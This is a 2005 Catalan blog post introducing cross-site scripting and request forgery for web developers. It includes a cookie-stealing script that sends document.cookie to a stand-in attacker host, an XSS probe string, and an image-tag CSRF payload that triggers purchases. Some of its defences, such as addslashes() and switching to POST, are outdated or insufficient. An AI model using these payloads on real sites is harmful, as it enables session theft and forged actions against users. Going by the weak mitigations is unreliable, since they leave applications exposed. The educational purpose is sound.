---
layout: post
title: Introducció a XSS i CSRF
date: 2005-08-29 17:08:02.000000000 +02:00
type: post
categories:
- security
tags: []
meta:
  tags: XSS CSRF security
permalink: "/2005/08/29/introduccio-a-xss-i-csrf/"
---
En aquest article intentaré explicar de forma bàsica en que consisteixen els atacs del tipus Cross Site Scripting (<acronym title="Cross Site Scripting">XSS</acronym>) i Cross Site Request Forgeries (<acronym title="Cross Site Request Forgeries">CSRF</acronym>, pronunciat "_sea surf_"), ja que tenir clar el concepte de <acronym title="Cross Site Scripting">XSS</acronym> és important per entendre el <acronym title="Cross Site Request Forgeries">CSRF</acronym>.

<!--more-->

### Cross Site Scripting

És possible explotar aquest tipus de vulnerabilitats degut a que el lloc web afectat no valida de forma correcta una entrada de dades procedent de l'exterior (comentaris fets en un blog, un email mostrat per un webmail...) que posteriorment és enviada a un altre client.

Per entendre que mostrar dades obtingudes de l'exterior a un altre usuari és perillós anem a veure un exemple. Aquest seria el codi HTML (simplificat) d'un formulari per enviar un comentari a un blog:

```
\<form action="/comentari.php" method="post"\> Nom: \<input type="text" name="nom" /\> \<textarea name="comentari"\>\</textarea\> \<input type="submit" value="Enviar" /\> \</form\>
```

Aquí, el script `comentari.php` és el que rep les dades enviades pel client per POST i és el que s'encarregarà de tractar-les (per exemple, emmagatzemar-les en una base de dades). Si aquest script no _sanititza_ les dades introduïdes en el formulari, un usuari maliciós ens podria colar un comentari com aquest:

```
\<script\>alert('Tonto!');\</script\>
```

Això provoca la execució de codi JavaScript en el client que visita la pàgina que conté el comentari maliciós. Un exemple de codi per injectar una mica més perillós que l'anterior podria ser el següent:

```
\<script\>document.location = 'http://hacker.example.com/robar\_cookies.php?cookies=' + document.cookie\</script\>
```

En aquest exemple, l'atacant colocaria un script php en un servidor web que mitjançant la variable <tt>$_GET['cookies']</tt> capturaria les cookies de la víctima, donant lloc a la possibilitat de capturar-li la sessió o suplantar la seva identitat en el lloc vulnerable.

Per evitar aquest tipus d'atac s'han de validar totes les entrades de dades procedents de l'exterior, en el cas de l'exemple s'hagués pogut evitar aplicant la funció `addslashes()` sobre les variables que contenen dades que recollim de l'exterior (<tt>$_POST['nom']</tt> i <tt>$_POST['comentari']</tt>). Si el backend on s'emmagatzemen aquestes dades és una bbdd MySQL existeix també la funció `mysql_escape_string()`. Generalment es solen utilitzar també les funcions `htmlentities()`, `strip_tags()`, i `utf8_decode()` per _sanititzar_ les entrades de dades.

Una manera ràpida de comprovar si una aplicació web és vulnerable a un atac <acronym title="Cross Site Scripting">XSS</acronym> és injectant-li aquesta cadena de caràcters com a entrada, i visualitzar el codi font del que ens retorna l'aplicació. Generalment si veiem "`<XSS`" en lloc de "`&lt;XSS`" l'aplicació és vulnerable.

```
'';!--"\<XSS\>=&{()}
```

**Nota:** S'ha de reemplaçar el "`&`" per "`%26`" si s'està injectant el codi a través de <tt>HTTP GET</tt>.

### Cross Site Request Forgeries

En el cas dels atacs <acronym title="Cross Site Scripting">XSS</acronym> teníem 3 elements per a dur a terme l'atac:

- El lloc web vulnerable a XSS (servidor)
- L'atacant (client)
- La víctima (client)

En els atacs <acronym title="Cross Site Request Forgeries">CSRF</acronym> tindrem 4 elements:

- El lloc web vulnerable 1 (servidor)
- L'atacant (client)
- La víctima (client)
- El lloc web vulnerable 2 (servidor)

Els atacs <acronym title="Cross Site Request Forgeries">CSRF</acronym> són similars als <acronym title="Cross Site Scripting">XSS</acronym> però utilitzant a la vicitma (client) com a _pont_ per a que execute una acció sobre el lloc web vulnerable 2 (servidor), es a dir, l'atacant provoca que el client realitze una petició <tt>HTTP</tt> sobre el lloc web vulnerable 2 sense que el client se'n adoni quan visiti el lloc web vulnerable 1.

La forma més comú d'atacs <acronym title="Cross Site Request Forgeries">CSRF</acronym> utilitza el tag `img` de HTML per a provocar la petició HTTP maliciosa del client víctima sobre el servidor vulnerable 2. Anem a veure-ho amb un exemple com el d'abans, on el lloc web vulnerable 1 conté un formulari com el següent per enviar un comentari a un blog:

```
\<form action="/comentari.php" method="post"\> Nom: \<input type="text" name="nom" /\> \<textarea name="comentari"\>\</textarea\> \<input type="submit" value="Enviar" /\> \</form\>
```

Imaginem que el lloc web vulnerable 2, és una web molt popular de venda de llibres per internet, que té el següent formulari (codi simplificat) per comprar llibres:

```
\<form action="/compra\_llibre.php"\> ISBN: \<input type="text" name="llibre" /\> Quantitat: \<input type="text" name="quantitat" /\> \<input type="submit" value="Enviar" /\> \</form\>
```

**Nota:** Cal fixar-se en que aquest formulari no especifica l'atribut `method` en el tag `form`, per tant les variables del formulari s'enviaran amb una petició <tt>HTTP GET</tt>.

L'atacant envia un comentari amb el següent codi HTML, i el script `comentari.php` del blog (lloc vulnerable 1) no _sanititza_ la entrada, provocant que es mostri el codi tal qual l'ha introduït l'atacant als posteriors clients que visitaran la pàgina.

```
\<img src="https://books.example.com/compra\_llibre.php?llibre=ISBN&quantitat=100"\>
```

Quan un client autenticat al lloc 2 (<tt>books.example.com</tt>) visiti el lloc 1 (<tt>blog.example.com</tt>) comprarà 100 llibres sense ni tan sols adonar-se'n de que els ha comprat.

Hi ha altes maneres més enginyoses de realitzar el mateix tipus d'atac, que fins i tot pot servir per saltar-se firewalls i executar codi sobre una aplicació web interna coneguda si la URL injectada és del tipus <tt>http://192.168.1.1/admin/post.php?...</tt>.

Protegir-se dels atacs <acronym title="Cross Site Request Forgeries">CSRF</acronym> és més difícil que protegir-se dels <acronym title="Cross Site Scripting">XSS</acronym>, generalment és recomanable utilitzar mètode <tt>POST</tt> en lloc de <tt>GET</tt> en els formularis. En el cas de <tt>books.example.com</tt> s'hauria d'utilitzar <tt>$_POST['llibre']</tt> i <tt>$_POST['quantitat']</tt> en lloc de <tt>$llibre</tt> i <tt>$quantitat</tt> si està el <tt>register_globals</tt> activat, i no utilitzar la variable <tt>$_REQUEST</tt> si està desactivat. El principal problema amb els atacs CSRF és que una petició maliciosa pot imitar l'enviament d'un formulari, per tant és bo implementar mètodes que ens asseguren que el formulari ha estat enviat des de la nostra pròpia pàgina per l'usuari que l'ha sol·licitat prèviament a l'enviament.

